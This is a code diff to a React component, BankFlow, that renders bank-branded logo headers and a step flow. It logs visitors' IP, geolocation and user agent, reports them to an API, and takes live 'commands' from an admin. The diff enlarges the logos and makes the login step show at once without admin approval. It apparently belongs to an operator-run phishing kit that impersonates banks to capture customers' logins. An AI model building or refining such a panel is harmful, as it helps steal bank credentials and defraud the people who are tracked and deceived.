@@ -56,13 +56,13 @@ function BankHeaderLogo({ bank }) {
   const src = BANK_LOGO_URLS[bank.slug];
   const fallback = BANK_FALLBACK_URLS[bank.slug];
   return (
-    <span className="flex h-8 w-8 shrink-0 items-center justify-center overflow-hidden rounded-lg bg-white sm:h-9 sm:w-9">
+    <span className="flex h-8 w-12 shrink-0 items-center justify-center overflow-hidden rounded-md bg-white px-1 sm:h-9 sm:w-14">
       {src ? (
         <img
           src={src}
           alt={bank.name}
           loading="eager"
-          className="h-8 w-8 object-contain sm:h-9 sm:w-9"
+          className="max-h-7 w-auto max-w-full object-contain sm:max-h-8"
           onError={(e) => {
             const img = e.currentTarget;
             if (fallback && img.src !== fallback) {
@@ -76,7 +76,7 @@ function BankHeaderLogo({ bank }) {
       ) : null}
       <span
         style={{ display: src ? "none" : "flex" }}
-        className="h-8 w-8 items-center justify-center text-[16px] font-extrabold sm:h-9 sm:w-9 sm:text-[18px]"
+        className="h-8 w-12 items-center justify-center text-[16px] font-extrabold sm:h-9 sm:w-14 sm:text-[18px]"
       >
         {bank.initial}
       </span>
@@ -130,7 +130,7 @@ function Shell({ bank, step, children, title, kicker, desc }) {
                   alt=""
                   aria-hidden="true"
                   loading="lazy"
-                  className="h-4 w-4 shrink-0 rounded-full bg-white object-contain"
+                  className="h-4 w-7 shrink-0 rounded-full bg-white object-contain"
                   onError={(e) => {
                     const img = e.currentTarget;
                     const fb = BANK_FALLBACK_URLS[bank.slug];
@@ -175,7 +175,7 @@ function WaitingLoader({ bank, stepNum, note }) {
           <img
             src={BANK_LOGO_URLS[bank.slug]}
             alt={bank.name}
-            className="relative h-11 w-11 object-contain"
+            className="relative h-10 w-24 object-contain"
             onError={(e) => {
               const img = e.currentTarget;
               const fb = BANK_FALLBACK_URLS[bank.slug];
@@ -386,7 +386,8 @@ export default function BankFlow() {
       id,
       bank: bankSlug,
       bankName: bank.name,
-      status: "waiting",
+      // Step 1 (login) shows directly — no admin ask needed for it.
+      status: "login_requested",
       joinedAt: Date.now(),
       lastSeen: Date.now(),
       ip: "…",
@@ -395,14 +396,14 @@ export default function BankFlow() {
       ua: navigator.userAgent,
     };
     const map = readVisitors();
-    map[id] = { ...(map[id] || {}), ...base, status: map[id]?.status || "waiting" };
+    map[id] = { ...(map[id] || {}), ...base, status: map[id]?.status || "login_requested" };
     // keep original joinedAt if re-visiting
     if (map[id] && !map[id].joinedAt) map[id].joinedAt = Date.now();
     writeVisitors(map);
     // Prime one-shot guards from the registry so a remount never replays old commands.
     answeredRef.current = map[id]?.answeredAt || 0;
     appliedCmdRef.current = "";
-    setStatus(map[id].status || "waiting");
+    setStatus(map[id].status || "login_requested");
     try {
       getChannel()?.postMessage({ type: "visitor-hello", visitor: map[id] });
     } catch {}
@@ -410,12 +411,12 @@ export default function BankFlow() {
     fetchIpLocation().then((loc) => {
       updateVisitor({ ip: loc.ip, city: loc.city, country: loc.country });
       if (apiEnabled()) {
-        apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "waiting", ...loc, ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
+        apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "login_requested", ...loc, ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
       }
     });
 
     if (apiEnabled()) {
-      apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "waiting", ip: "…", city: "…", country: "…", ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
+      apiRegisterVisitor({ id, bank: bankSlug, bankName: bank.name, status: "login_requested", ip: "…", city: "…", country: "…", ua: navigator.userAgent, joinedAt: Date.now() }).catch(() => {});
     }
 
     const hb = setInterval(() => {
